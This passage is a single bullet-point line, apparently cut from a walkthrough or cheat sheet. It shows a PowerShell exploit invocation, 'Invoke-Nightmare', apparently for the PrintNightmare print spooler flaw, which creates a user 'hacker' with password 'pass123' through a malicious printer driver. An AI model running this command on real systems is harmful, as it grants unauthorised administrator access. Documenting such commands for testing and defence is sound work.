            *   `Invoke-Nightmare -NewUser "hacker" -NewPassword "pass123" -DriverName "PrintMe"`